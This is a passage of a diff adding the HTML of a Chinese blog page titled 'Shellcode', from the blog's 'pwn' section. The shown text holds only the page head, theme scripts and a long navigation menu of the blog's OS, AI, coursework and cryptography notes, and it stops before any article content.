@@ -1,0 +1,5346 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://maple-pwn.github.io/pwn/Stack/shellcode-all-in-one/">
+      
+      
+        <link rel="prev" href="../fmt-all-in-one/">
+      
+      
+        <link rel="next" href="../SROP/">
+      
+      
+      <link rel="icon" href="../../../images/logo.svg">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.20">
+    
+    
+      
+        <title>Shellcode - Maple's blog</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.e53b48f4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../resources/css/extra.css">
+    
+      <link rel="stylesheet" href="../../../resources/css/tittle.css">
+    
+      <link rel="stylesheet" href="../../../resources/css/read-metrics.css">
+    
+      <link rel="stylesheet" href="../../../resources/css/leftsidebar.css">
+    
+      <link rel="stylesheet" href="https://static.zeoseven.com/zsft/292/main/result.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#shellcode" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../.." title="Maple&#39;s blog" class="md-header__button md-logo" aria-label="Maple's blog" data-md-component="logo">
+      
+  <img src="../../../images/logo.svg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Maple's blog
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Shellcode
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="切换到深色模式"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="切换到深色模式" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="切换到浅色模式"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="切换到浅色模式" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../mysys/pre/" class="md-tabs__link">
+          
+  
+  
+  OS篇
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../LLMZtH/pre/" class="md-tabs__link">
+          
+  
+  
+  AI篇
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../study/pre/" class="md-tabs__link">
+          
+  
+  
+  校内篇
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../READ/paperread/mHC/" class="md-tabs__link">
+          
+  
+  
+  阅读篇
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../pre/" class="md-tabs__link">
+          
+  
+  
+  pwn篇
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../thinking/pre/" class="md-tabs__link">
+          
+  
+  
+  论道篇
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../sth/proj/" class="md-tabs__link">
+          
+  
+  
+  杂篇
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="https://game.oldmaple.top" class="md-tabs__link">
+        
+  
+  
+    
+  
+  🎮 游戏
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Maple&#39;s blog" class="md-nav__button md-logo" aria-label="Maple's blog" data-md-component="logo">
+      
+  <img src="../../../images/logo.svg" alt="logo">
+
+    </a>
+    Maple's blog
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    OS篇
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1">
+            <span class="md-nav__icon md-icon"></span>
+            OS篇
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mysys/pre/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    前言
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mysys/01/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    实模式
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mysys/02/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    保护模式
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mysys/03/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    内核
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mysys/04/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    内存管理
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mysys/05/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    IO机制
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mysys/06/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    扩展文件系统
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    AI篇
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            AI篇
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../LLMZtH/pre/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    前言
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    AI细碎知识
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            AI细碎知识
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../LLMZtH/Agent/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Agent
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../LLMZtH/RAG/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    RAG
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../LLMZtH/LLMWAF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    LLM防火墙
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../LLMZtH/LLMT10/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    LLM安全Top10
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    ML学习笔记
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            ML学习笔记
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../LLMZtH/ML/1-3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    基本知识
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../LLMZtH/ML/4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    第四章 决策树
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../LLMZtH/ML/5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    第五章 神经网络
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../LLMZtH/ML/6/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    第六章 支持向量机
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../LLMZtH/ML/7/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    第七章 贝叶斯分类器
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../LLMZtH/ML/7_1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    7 1
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../LLMZtH/ML/8/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    第八章 集成学习
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../LLMZtH/ML/9/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    第九章 聚类
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../LLMZtH/ML/10/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    第十章 降维与度量学习
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../LLMZtH/ML/11/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    第十一章 特征选择与稀疏学习
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../LLMZtH/ML/12/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    后记
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    RL学习笔记
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            RL学习笔记
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../LLMZtH/RL/1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    1
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_5" id="__nav_2_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    DL学习笔记
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_5">
+            <span class="md-nav__icon md-icon"></span>
+            DL学习笔记
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../LLMZtH/DL/1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    前言
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../LLMZtH/DL/images-class/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    图像识别翻译
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../LLMZtH/DL/images-class-py/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    图像识别实现
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../LLMZtH/DL/linear/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    线性分类翻译
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../LLMZtH/DL/linear-py/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    线性分类实现
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../LLMZtH/DL/optimization/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    优化-翻译
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../LLMZtH/DL/Backprop/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    反向传播-翻译
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    校内篇
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            校内篇
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/pre/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    前言
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/eda/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    数字逻辑
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    大学物理
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            大学物理
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/dw/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    十二、十三章
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/dw2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    十四、十五章
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/gt/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    概率与统计
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/lisan/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    离散数学
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/mao/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    毛中特
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_7" id="__nav_3_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    计算机组成原理
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_7">
+            <span class="md-nav__icon md-icon"></span>
+            计算机组成原理
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/cs_final/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    部分笔记
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/cs_exam/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    部分试卷&重点题目分析
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_8" id="__nav_3_8_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    密码学引论
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_8">
+            <span class="md-nav__icon md-icon"></span>
+            密码学引论
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/cry/crypto/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    笔记
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/cry/math_base/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    数学基础
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/cry/AES/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    算法介绍-AES
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/cry/SM4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    算法介绍-SM4
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/cry/SHA3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    算法介绍-SHA3
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/cry/SM3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    算法介绍-SM3
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/cry/ZUC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    算法介绍-ZUC
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study/cry/RSA%26EIGamal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    算法介绍-RSA&EIGamal
+    
+  </span>
+  
+
